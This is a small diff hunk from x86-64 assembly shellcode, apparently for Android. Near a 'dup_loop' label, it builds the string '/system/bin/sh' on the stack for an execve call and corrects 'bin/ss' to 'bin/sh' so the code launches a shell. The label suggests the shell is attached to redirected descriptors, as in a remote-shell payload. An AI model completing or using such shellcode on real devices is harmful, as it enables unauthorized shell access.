@@ -114,7 +114,7 @@ dup_loop:
 		pop	rdx		; *envp[] = 0
 		push	rsi		; '\0'
 		;;;;mov	rdi, '//system/bin/ss'	; str
-		mov rdi, 'bin/ss'
+		mov rdi, 'bin/sh'
 		push rdi
 		mov	rdi, '/system/' ; str
 		push rdi
